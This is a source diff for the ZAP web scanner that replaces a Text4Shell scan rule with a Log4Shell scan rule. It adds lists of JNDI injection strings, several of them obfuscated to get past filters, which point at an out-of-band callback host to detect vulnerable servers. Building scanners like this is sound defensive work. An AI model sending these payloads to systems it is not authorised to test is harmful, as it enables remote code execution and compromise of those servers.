@@ -3,7 +3,7 @@
  *
  * ZAP is an HTTP/HTTPS proxy for assessing web application security.
  *
- * Copyright 2022 The ZAP Development Team
+ * Copyright 2021 The ZAP Development Team
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -17,7 +17,7 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package org.zaproxy.zap.extension.ascanrulesAlpha;
+package org.zaproxy.zap.extension.ascanrules;
 
 import java.io.IOException;
 import java.util.Arrays;
@@ -37,19 +37,37 @@ import org.zaproxy.addon.oast.ExtensionOast;
 import org.zaproxy.zap.model.Tech;
 import org.zaproxy.zap.model.TechSet;
 
-public class Text4ShellScanRule extends AbstractAppParamPlugin {
+public class Log4ShellScanRule extends AbstractAppParamPlugin {
 
-    private static final Logger LOGGER = LogManager.getLogger(Text4ShellScanRule.class);
-    private static final String PREFIX = "ascanalpha.text4shell.";
-    private static final String CVE = "CVE-2022-42889";
-    private static final String[] ATTACK_PATTERNS = {
-        "${url:UTF-8:http://{0}/bingo}", "${url:UTF-8:https://{0}/bingo}"
+    private static final Logger LOGGER = LogManager.getLogger(Log4ShellScanRule.class);
+    private static final String PREFIX = "ascanrules.log4shell.";
+    private static final String PREFIX_CVE44228 = PREFIX + "cve44228.";
+    private static final String PREFIX_CVE45046 = PREFIX + "cve45046.";
+    private static final String[] ATTACK_PATTERNS_CVE44228 = {
+        "${jndi:ldap://{0}/abc}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/abc}",
+        "${${::-j}ndi:rmi://{0}/abc}",
+        "${jndi:rmi://{0}/abc}",
+        "${${lower:jndi}:${lower:rmi}://{0}/abc}",
+        "${${lower:${lower:jndi}}:${lower:rmi}://{0}/abc}",
+        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/abc}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/abc}",
+        "${jndi:dns://{0}/abc}",
+        "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/abc}"
     };
-    protected static final int ATTACK_PATTERN_COUNT = ATTACK_PATTERNS.length;
+    private static final String[] ATTACK_PATTERNS_CVE45046 = {
+        "${jndi:ldap://127.0.0.1#a.{0}:1389/abc}",
+        "${jndi:ldap://127.0.0.1#a.{0}/abc}",
+        "${jndi:ldap://localhost#a.{0}/abc}"
+    };
+    protected static final int ATTACK_PATTERN_COUNT =
+            ATTACK_PATTERNS_CVE44228.length + ATTACK_PATTERNS_CVE45046.length;
+    private static final String CVE_44228 = "CVE-2021-44228";
+    private static final String CVE_45046 = "CVE-2021-45046";
 
     @Override
     public int getId() {
-        return 40047;
+        return 40043;
     }
 
     @Override
@@ -64,22 +82,22 @@ public class Text4ShellScanRule extends AbstractAppParamPlugin {
 
     @Override
     public String getDescription() {
-        return Constant.messages.getString(PREFIX + "desc");
+        return "";
     }
 
     @Override
     public int getCategory() {
-        return Category.INJECTION;
+        return Category.MISC;
     }
 
     @Override
     public String getSolution() {
-        return Constant.messages.getString(PREFIX + "soln");
+        return "";
     }
 
     @Override
     public String getReference() {
-        return Constant.messages.getString(PREFIX + "refs");
+        return "";
     }
 
     @Override
@@ -96,7 +114,8 @@ public class Text4ShellScanRule extends AbstractAppParamPlugin {
                                 CommonAlertTag.OWASP_2017_A09_VULN_COMP,
                                 CommonAlertTag.WSTG_V42_INPV_11_CODE_INJ));
         alertTags.put(ExtensionOast.OAST_ALERT_TAG_KEY, ExtensionOast.OAST_ALERT_TAG_VALUE);
-        CommonAlertTag.putCve(alertTags, CVE);
+        CommonAlertTag.putCve(alertTags, CVE_44228);
+        CommonAlertTag.putCve(alertTags, CVE_45046);
         return alertTags;
     }
 
@@ -122,19 +141,22 @@ public class Text4ShellScanRule extends AbstractAppParamPlugin {
     @Override
     public void scan(HttpMessage msg, String param, String value) {
         try {
-            scanWithPayloads(param, ATTACK_PATTERNS);
+            scanWithPayloads(param, ATTACK_PATTERNS_CVE44228, PREFIX_CVE44228);
+            scanWithPayloads(param, ATTACK_PATTERNS_CVE45046, PREFIX_CVE45046);
         } catch (Exception e) {
             LOGGER.error(e.getMessage(), e);
         }
     }
 
-    private void scanWithPayloads(String param, String[] attackPatterns) throws Exception {
+    private void scanWithPayloads(String param, String[] attackPatterns, String alertPrefix)
+            throws Exception {
         ExtensionOast extOast =
                 Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
         for (String attackPattern : attackPatterns) {
             try {
                 HttpMessage testMsg = getNewMsg();
-                Alert alert = newCustomAlert().setParam(param).setMessage(testMsg).build();
+                Alert alert =
+                        newCustomAlert(alertPrefix).setParam(param).setMessage(testMsg).build();
                 String payload = extOast.registerAlertAndGetPayload(alert);
                 String attack = attackPattern.replace("{0}", payload);
                 alert.setAttack(attack);
@@ -146,12 +168,21 @@ public class Text4ShellScanRule extends AbstractAppParamPlugin {
         }
     }
 
-    private AlertBuilder newCustomAlert() {
-        return newAlert().setConfidence(Alert.CONFIDENCE_MEDIUM);
+    private AlertBuilder newCustomAlert(String alertPrefix) {
+        return newAlert()
+                .setName(Constant.messages.getString(alertPrefix + "name"))
+                .setDescription(Constant.messages.getString(alertPrefix + "desc"))
+                .setSolution(Constant.messages.getString(alertPrefix + "soln"))
+                .setReference(Constant.messages.getString(alertPrefix + "refs"))
+                .setConfidence(Alert.CONFIDENCE_MEDIUM)
+                .setAlertRef(PREFIX_CVE44228.equals(alertPrefix) ? getId() + "-1" : getId() + "-2")
+                .setTags(getAlertTags())
+                .removeTag(PREFIX_CVE44228.equals(alertPrefix) ? CVE_45046 : CVE_44228);
     }
 
     @Override
     public List<Alert> getExampleAlerts() {
-        return Arrays.asList(newCustomAlert().build());
+        return Arrays.asList(
+                newCustomAlert(PREFIX_CVE44228).build(), newCustomAlert(PREFIX_CVE45046).build());
     }
 }
